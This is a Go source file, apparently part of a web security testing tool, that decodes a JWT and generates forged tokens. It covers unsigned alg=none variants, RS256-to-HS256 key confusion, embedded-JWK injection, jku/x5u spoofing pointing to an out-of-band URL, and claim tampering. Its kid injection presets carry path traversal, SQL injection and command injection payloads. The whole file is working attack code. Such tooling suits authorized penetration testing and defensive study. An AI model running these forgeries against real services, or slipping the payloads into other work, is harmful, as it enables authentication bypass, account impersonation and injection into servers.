package active

import (
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
	"strings"
	"time"
)

// JWTForgeRequest describes an input token and optional attack parameters.
type JWTForgeRequest struct {
	Token            string                 `json:"token"`
	AttackType       string                 `json:"attack_type"` // "all", "none", "key_confusion", "jwk_inject", "jku_x5u", "kid_inject", "claim_tamper"
	HeaderOverrides  map[string]interface{} `json:"header_overrides,omitempty"`
	PayloadOverrides map[string]interface{} `json:"payload_overrides,omitempty"`
	PublicKeyPEM     string                 `json:"public_key_pem,omitempty"`
	OASTURL          string                 `json:"oast_url,omitempty"`
	HMACSecret       string                 `json:"hmac_secret,omitempty"`
	ExtendExpYear    bool                   `json:"extend_exp_year,omitempty"`
}

// JWTForgeVariant is a single generated mutated JWT token with metadata.
type JWTForgeVariant struct {
	Name        string `json:"name"`
	Category    string `json:"category"`
	Description string `json:"description"`
	Token       string `json:"token"`
}

// JWTForgeResponse holds decoded parts and generated attack mutations.
type JWTForgeResponse struct {
	Header    map[string]interface{} `json:"header"`
	Payload   map[string]interface{} `json:"payload"`
	Signature string                 `json:"signature"`
	JWKSJSON  string                 `json:"jwks_json,omitempty"`
	Variants  []JWTForgeVariant      `json:"variants"`
}

func b64urlEncodeJSON(v interface{}) (string, error) {
	raw, err := json.Marshal(v)
	if err != nil {
		return "", err
	}
	return base64.RawURLEncoding.EncodeToString(raw), nil
}

func signHS256(signingInput string, key []byte) string {
	mac := hmac.New(sha256.New, key)
	_, _ = mac.Write([]byte(signingInput))
	return base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
}

func signRS256(signingInput string, priv *rsa.PrivateKey) (string, error) {
	sum := sha256.Sum256([]byte(signingInput))
	sig, err := rsa.SignPKCS1v15(rand.Reader, priv, crypto.SHA256, sum[:])
	if err != nil {
		return "", err
	}
	return base64.RawURLEncoding.EncodeToString(sig), nil
}

func cloneMapInterface(src map[string]interface{}) map[string]interface{} {
	dst := make(map[string]interface{}, len(src))
	for k, v := range src {
		dst[k] = v
	}
	return dst
}

// ForgeJWTAttackVariants decodes a JWT and generates all 6 F5 attack categories.
func ForgeJWTAttackVariants(req JWTForgeRequest) (JWTForgeResponse, error) {
	token := strings.TrimSpace(req.Token)
	token = strings.TrimPrefix(token, "Bearer ")
	token = strings.TrimPrefix(token, "bearer ")
	token = strings.TrimSpace(token)

	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return JWTForgeResponse{}, fmt.Errorf("invalid JWT format: expected 3 dot-separated parts")
	}

	hdrBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return JWTForgeResponse{}, fmt.Errorf("invalid JWT header base64: %w", err)
	}
	pldBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return JWTForgeResponse{}, fmt.Errorf("invalid JWT payload base64: %w", err)
	}

	var baseHeader map[string]interface{}
	if err := json.Unmarshal(hdrBytes, &baseHeader); err != nil {
		return JWTForgeResponse{}, fmt.Errorf("invalid JWT header JSON: %w", err)
	}
	var basePayload map[string]interface{}
	if err := json.Unmarshal(pldBytes, &basePayload); err != nil {
		return JWTForgeResponse{}, fmt.Errorf("invalid JWT payload JSON: %w", err)
	}

	// Apply any user header/payload overrides
	for k, v := range req.HeaderOverrides {
		baseHeader[k] = v
	}
	for k, v := range req.PayloadOverrides {
		basePayload[k] = v
	}
	if req.ExtendExpYear {
		basePayload["exp"] = time.Now().Add(365 * 24 * time.Hour).Unix()
	}

	payloadB64, err := b64urlEncodeJSON(basePayload)
	if err != nil {
		return JWTForgeResponse{}, err
	}

	attackType := strings.ToLower(strings.TrimSpace(req.AttackType))
	if attackType == "" {
		attackType = "all"
	}
	want := func(cat string) bool {
		return attackType == "all" || attackType == cat
	}

	resp := JWTForgeResponse{
		Header:    baseHeader,
		Payload:   basePayload,
		Signature: parts[2],
		Variants:  []JWTForgeVariant{},
	}

	// 1. None Algorithm Variants
	if want("none") {
		for _, alg := range []string{"none", "None", "NONE", "nOnE"} {
			h := cloneMapInterface(baseHeader)
			h["alg"] = alg
			if hB64, err := b64urlEncodeJSON(h); err == nil {
				resp.Variants = append(resp.Variants, JWTForgeVariant{
					Name:        fmt.Sprintf("alg=%s (unsigned)", alg),
					Category:    "none",
					Description: "Unsigned token with alg=" + alg + " and trailing dot preserved",
					Token:       hB64 + "." + payloadB64 + ".",
				})
			}
		}
	}

	// 2. Key Confusion (RS256 -> HS256 using public key bytes)
	if want("key_confusion") && strings.TrimSpace(req.PublicKeyPEM) != "" {
		h := cloneMapInterface(baseHeader)
		h["alg"] = "HS256"
		if hB64, err := b64urlEncodeJSON(h); err == nil {
			si := hB64 + "." + payloadB64
			sig := signHS256(si, []byte(req.PublicKeyPEM))
			resp.Variants = append(resp.Variants, JWTForgeVariant{
				Name:        "Key Confusion (RS256 → HS256)",
				Category:    "key_confusion",
				Description: "Signed with HMAC-SHA256 using the server's public key PEM bytes",
				Token:       si + "." + sig,
			})
		}
	}

	// Generate ephemeral RSA keypair once for JWK injection and JKU/X5U spoofing
	var rsaPriv *rsa.PrivateKey
	var rsaJWK map[string]interface{}
	if want("jwk_inject") || want("jku_x5u") {
		if generated, genErr := rsa.GenerateKey(rand.Reader, 2048); genErr == nil {
			rsaPriv = generated
			pub := &rsaPriv.PublicKey
			rsaJWK = map[string]interface{}{
				"kty": "RSA",
				"kid": "rr-forged-key-1",
				"use": "sig",
				"alg": "RS256",
				"n":   base64.RawURLEncoding.EncodeToString(pub.N.Bytes()),
				"e":   base64.RawURLEncoding.EncodeToString(big.NewInt(int64(pub.E)).Bytes()),
			}
			jwksObj := map[string]interface{}{"keys": []interface{}{rsaJWK}}
			if jwksBytes, err := json.MarshalIndent(jwksObj, "", "  "); err == nil {
				resp.JWKSJSON = string(jwksBytes)
			}
		}
	}

	// 3. JWK Header Injection
	if want("jwk_inject") && rsaPriv != nil && rsaJWK != nil {
		h := cloneMapInterface(baseHeader)
		h["alg"] = "RS256"
		h["kid"] = rsaJWK["kid"]
		h["jwk"] = rsaJWK
		if hB64, err := b64urlEncodeJSON(h); err == nil {
			si := hB64 + "." + payloadB64
			if sig, err := signRS256(si, rsaPriv); err == nil {
				resp.Variants = append(resp.Variants, JWTForgeVariant{
					Name:        "JWK Header Injection (Embedded RSA)",
					Category:    "jwk_inject",
					Description: "Self-signed RS256 token with attacker public JWK embedded in header",
					Token:       si + "." + sig,
				})
			}
		}
	}

	// 4. JKU / X5U OAST & Local Spoofing
	if want("jku_x5u") && rsaPriv != nil {
		oastBase := strings.TrimRight(strings.TrimSpace(req.OASTURL), "/")
		if oastBase == "" {
			oastBase = "http://127.0.0.1:8080/oast"
		}
		for _, field := range []string{"jku", "x5u"} {
			h := cloneMapInterface(baseHeader)
			h["alg"] = "RS256"
			h["kid"] = "rr-forged-key-1"
			h[field] = oastBase + "/.well-known/jwks.json"
			if hB64, err := b64urlEncodeJSON(h); err == nil {
				si := hB64 + "." + payloadB64
				if sig, err := signRS256(si, rsaPriv); err == nil {
					resp.Variants = append(resp.Variants, JWTForgeVariant{
						Name:        fmt.Sprintf("%s Spoofing (OAST JWKS)", strings.ToUpper(field)),
						Category:    "jku_x5u",
						Description: fmt.Sprintf("Points %s to %s/.well-known/jwks.json", field, oastBase),
						Token:       si + "." + sig,
					})
				}
			}
		}
	}

	// 5. KID Injection Presets
	if want("kid_inject") {
		kidPresets := []struct {
			name   string
			kid    string
			secret string
		}{
			{"KID Path Traversal (/dev/null)", "../../../../dev/null", ""},
			{"KID SQL Injection", "' UNION SELECT 'secret'--", "secret"},
			{"KID Command Injection", "key.pem|id", "secret"},
		}
		for _, preset := range kidPresets {
			h := cloneMapInterface(baseHeader)
			h["alg"] = "HS256"
			h["kid"] = preset.kid
			if hB64, err := b64urlEncodeJSON(h); err == nil {
				si := hB64 + "." + payloadB64
				sig := signHS256(si, []byte(preset.secret))
				resp.Variants = append(resp.Variants, JWTForgeVariant{
					Name:        preset.name,
					Category:    "kid_inject",
					Description: fmt.Sprintf("Injects kid=%q signed with %q", preset.kid, preset.secret),
					Token:       si + "." + sig,
				})
			}
		}
	}

	// 6. Claim Tampering (with custom secret or original signature re-emit)
	if want("claim_tamper") {
		h := cloneMapInterface(baseHeader)
		if req.HMACSecret != "" {
			h["alg"] = "HS256"
			if hB64, err := b64urlEncodeJSON(h); err == nil {
				si := hB64 + "." + payloadB64
				sig := signHS256(si, []byte(req.HMACSecret))
				resp.Variants = append(resp.Variants, JWTForgeVariant{
					Name:        "Claim Tampered (HS256 Signed)",
					Category:    "claim_tamper",
					Description: "Re-signed modified claims with provided HMAC secret",
					Token:       si + "." + sig,
				})
			}
		} else if hB64, err := b64urlEncodeJSON(h); err == nil {
			resp.Variants = append(resp.Variants, JWTForgeVariant{
				Name:        "Claim Tampered (Original Signature Kept)",
				Category:    "claim_tamper",
				Description: "Modified claims keeping original signature to test missing verification",
				Token:       hB64 + "." + payloadB64 + "." + parts[2],
			})
		}
	}

	return resp, nil
}
